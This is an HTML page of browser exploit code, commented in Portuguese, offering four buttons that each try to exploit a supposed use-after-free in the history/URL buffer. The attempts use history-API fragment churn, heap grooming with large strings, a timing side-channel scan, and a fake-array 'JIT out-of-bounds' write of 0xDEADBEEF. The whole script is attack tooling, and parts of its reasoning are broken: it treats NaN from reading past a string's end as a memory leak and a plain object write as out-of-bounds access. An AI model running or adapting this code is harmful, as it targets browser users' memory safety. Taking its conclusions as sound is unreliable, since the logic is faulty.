
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>UAF - 4 Opcoes Finais</title>
</head>
<body>
<h1>UAF String Buffer - 4 Opcoes de Exploracao</h1>

<h2>Escolha o teste:</h2>
<button onclick="testOption1()">OPCAO 1 - Pre-Ocupacao</button><br><br>
<button onclick="testOption2()">OPCAO 2 - Explorar NaN Direto</button><br><br>
<button onclick="testOption3()">OPCAO 3 - Focar Header (0-63)</button><br><br>
<button onclick="testOption4()">OPCAO 4 - Conexao JIT OOB</button><br><br>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(m) { logEl.textContent += m + "\n"; }
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ========================================
// UAF TRIGGER - SEQUENCIA VALIDADA
// ========================================
async function triggerUAF() {
    log("=== UAF TRIGGER START ===");
    let size = 977;
    const STEP = 14461;
    
    for(let i = 0; i < 48; i++) {
        let frag = "A".repeat(size);
        history.pushState({i: i}, "", "#" + frag);
        history.replaceState({i: i}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) {
            setTimeout(() => history.back(), 0);
            log("[ITER " + i + "] back() async");
        }
        
        size += STEP;
        await sleep(5);
    }
    
    log(">>> UAF WINDOW <<<");
    await sleep(120);
}

// ========================================
// OPCAO 1: PRE-OCUPACAO
// Alocar strings ANTES do UAF trigger
// ========================================
async function testOption1() {
    logEl.textContent = "";
    log("=== OPCAO 1: PRE-OCUPACAO ===\n");
    log("Estrategia: Alocar strings no mesmo region ANTES do UAF\n");
    
    // FASE 1: Pre-alocacao massiva
    log(">>> FASE 1: PRE-ALOCACAO <<<");
    let preAlloc = [];
    
    for(let i = 0; i < 500; i++) {
        // Strings com marker unico
        let marker = String.fromCharCode(0x5050 + (i & 0xFF));
        preAlloc.push(marker.repeat(170000));
    }
    
    log("Pre-alocado: " + preAlloc.length + " strings (~340KB cada)");
    
    // Manter algumas vivas, liberar outras
    let keepAlive = [];
    for(let i = 0; i < preAlloc.length; i++) {
        if(i % 3 === 0) {
            keepAlive.push(preAlloc[i]);
        }
        // Outras sao liberadas (null implicito)
    }
    
    log("Mantidas vivas: " + keepAlive.length);
    log("Liberadas: " + (preAlloc.length - keepAlive.length));
    
    await sleep(100);
    
    // FASE 2: Trigger UAF
    log("\n>>> FASE 2: UAF TRIGGER <<<");
    await triggerUAF();
    
    // FASE 3: Collapse
    log("\n>>> FASE 3: FRAGMENT COLLAPSE <<<");
    history.replaceState({}, "", "#X");
    
    await sleep(50);
    
    // FASE 4: Diagnostico
    log("\n>>> FASE 4: DIAGNOSTICO <<<");
    diagnose();
    
    window.__keep1 = keepAlive;
    log("\n=== FIM OPCAO 1 ===");
}

// ========================================
// OPCAO 2: EXPLORAR NaN DIRETO
// Usar o NaN como primitiva
// ========================================
async function testOption2() {
    logEl.textContent = "";
    log("=== OPCAO 2: EXPLORAR NaN DIRETO ===\n");
    log("Estrategia: Usar NaN como primitiva de info leak\n");
    
    await triggerUAF();
    
    log("\n>>> FRAGMENT COLLAPSE <<<");
    history.replaceState({}, "", "#X");
    
    await sleep(50);
    
    log("\n>>> ANALISE DETALHADA <<<");
    
    let url = location.href;
    log("URL.length: " + url.length);
    
    // Scan completo de todos os offsets
    log("\nScan completo (0-1000):");
    let validCount = 0;
    let nanCount = 0;
    let lastValid = -1;
    
    for(let i = 0; i < 1000; i++) {
        let code = url.charCodeAt(i);
        if(!isNaN(code)) {
            validCount++;
            lastValid = i;
        } else {
            nanCount++;
        }
    }
    
    log("Valores validos: " + validCount);
    log("NaN encontrados: " + nanCount);
    log("Ultimo offset valido: " + lastValid);
    
    // Tentar ler incrementalmente
    log("\nLeitura incremental byte-a-byte:");
    for(let i = lastValid - 5; i <= lastValid + 10; i++) {
        let code = url.charCodeAt(i);
        log("  [" + i + "] = " + code + " (0x" + code.toString(16) + ")");
    }
    
    // Timing analysis
    log("\nTiming analysis:");
    let startValid = performance.now();
    for(let i = 0; i < 100; i++) {
        url.charCodeAt(10); // offset valido
    }
    let timeValid = performance.now() - startValid;
    
    let startNaN = performance.now();
    for(let i = 0; i < 100; i++) {
        url.charCodeAt(100); // offset NaN
    }
    let timeNaN = performance.now() - startNaN;
    
    log("Tempo leitura valida: " + timeValid.toFixed(3) + "ms");
    log("Tempo leitura NaN: " + timeNaN.toFixed(3) + "ms");
    log("Diferenca: " + (timeNaN - timeValid).toFixed(3) + "ms");
    
    if(Math.abs(timeNaN - timeValid) > 0.5) {
        log("\n>>> TIMING SIDE-CHANNEL DETECTADO!");
    }
    
    log("\n=== FIM OPCAO 2 ===");
}

// ========================================
// OPCAO 3: FOCAR NO HEADER (0-63 bytes)
// ========================================
async function testOption3() {
    logEl.textContent = "";
    log("=== OPCAO 3: FOCAR NO HEADER (0-63) ===\n");
    log("Estrategia: Manipular os 64 bytes ainda validos\n");
    
    await triggerUAF();
    
    log("\n>>> FRAGMENT COLLAPSE <<<");
    history.replaceState({}, "", "#X");
    
    await sleep(50);
    
    log("\n>>> ANALISE DO HEADER <<<");
    
    let url = location.href;
    log("URL completo: " + url);
    log("URL.length: " + url.length);
    
    // Ler todos os 64 bytes validos
    log("\nHeader completo (0-63):");
    let header = "";
    for(let i = 0; i < 64; i++) {
        let code = url.charCodeAt(i);
        if(!isNaN(code)) {
            header += String.fromCharCode(code);
            if(i % 16 === 0) log("");
            process.stdout?.write?.(" [" + i + "]=0x" + code.toString(16));
        }
    }
    
    log("\n\nHeader como string: " + header);
    log("Header length: " + header.length);
    
    // Tentar manipular via replaceState
    log("\n>>> TENTATIVA DE MANIPULACAO <<<");
    
    // Criar fragments que afetem especificamente os primeiros 64 bytes
    let tests = [
        "#" + "B".repeat(10),
        "#" + "C".repeat(32),
        "#" + "D".repeat(50),
        "#" + "E".repeat(63)
    ];
    
    for(let i = 0; i < tests.length; i++) {
        history.replaceState({}, "", tests[i]);
        await sleep(10);
        
        let newUrl = location.href;
        let changed = (newUrl !== url);
        log("Test " + i + ": " + tests[i].substring(0, 10) + "... -> Changed: " + changed);
        
        if(changed) {
            // Ver se afetou o header
            let newHeader = "";
            for(let j = 0; j < 64; j++) {
                let code = newUrl.charCodeAt(j);
                if(!isNaN(code)) {
                    newHeader += String.fromCharCode(code);
                }
            }
            log("  Novo header: " + newHeader);
        }
    }
    
    log("\n=== FIM OPCAO 3 ===");
}

// ========================================
// OPCAO 4: CONEXAO COM JIT OOB
// ========================================
async function testOption4() {
    logEl.textContent = "";
    log("=== OPCAO 4: CONEXAO JIT OOB + UAF ===\n");
    log("Estrategia: Usar UAF como amplificador do JIT OOB\n");
    
    // FASE 1: Setup JIT OOB
    log(">>> FASE 1: SETUP JIT OOB <<<");
    
    function jitConfuse(arr) {
        // Forcar JIT compilation
        for(let i = 0; i < 10000; i++) {
            arr[0] = i;
        }
    }
    
    let realArray = new Uint32Array(4);
    
    // Warm up JIT
    for(let i = 0; i < 100; i++) {
        jitConfuse(realArray);
    }
    
    log("JIT compilado");
    
    // FASE 2: Trigger UAF
    log("\n>>> FASE 2: UAF TRIGGER <<<");
    await triggerUAF();
    
    log("\n>>> FRAGMENT COLLAPSE <<<");
    history.replaceState({}, "", "#X");
    
    await sleep(50);
    
    // FASE 3: Criar fake array
    log("\n>>> FASE 3: FAKE ARRAY <<<");
    
    let fakeArray = {
        0: 0,
        1: 0,
        2: 0,
        3: 0,
        length: 4096 // fake length
    };
    
    log("Fake array criado com length: " + fakeArray.length);
    
    // FASE 4: Tentar usar JIT com fake array
    log("\n>>> FASE 4: JIT COM FAKE ARRAY <<<");
    
    try {
        jitConfuse(fakeArray);
        
        // Tentar OOB write
        log("Tentando OOB write...");
        fakeArray[100] = 0xDEADBEEF;
        
        log("OOB write: fakeArray[100] = 0xDEADBEEF");
        log("OOB read: fakeArray[100] = 0x" + fakeArray[100].toString(16));
        
        if(fakeArray[100] === 0xDEADBEEF) {
            log("\n>>> OOB FUNCIONAL!");
        }
        
    } catch(e) {
        log("Erro no JIT: " + e);
    }
    
    // FASE 5: Tentar ler URL via JIT confusion
    log("\n>>> FASE 5: TENTAR LER URL VIA JIT <<<");
    
    let url = location.href;
    
    // Criar TypedArray que possa sobrepor com URL buffer
    let probe = new Uint32Array(1000);
    for(let i = 0; i < probe.length; i++) {
        probe[i] = 0x41414141;
    }
    
    log("Probe array criado");
    
    // Ver se algum valor "vazou"
    let leaked = false;
    for(let i = 0; i < probe.length; i++) {
        if(probe[i] !== 0x41414141) {
            log("Possivel leak no index " + i + ": 0x" + probe[i].toString(16));
            leaked = true;
        }
    }
    
    if(!leaked) {
        log("Nenhum leak detectado no probe array");
    }
    
    diagnose();
    
    window.__keep4 = {fakeArray, probe, realArray};
    log("\n=== FIM OPCAO 4 ===");
}

// ========================================
// DIAGNOSTICO COMUM
// ========================================
function diagnose() {
    log("\n=== DIAGNOSTICO ===");
    log("URL.length: " + location.href.length);
    log("hash.length: " + location.hash.length);
    
    let url = location.href;
    let offsets = [0, 32, 64, 128, 256];
    
    log("\nCharCode scan:");
    for(let off of offsets) {
        let code = url.charCodeAt(off);
        log("  [" + off + "] = " + code + " (0x" + code.toString(16) + ")");
    }
}

log("Escolha uma opcao acima para testar.");
</script>

</body>
</html>
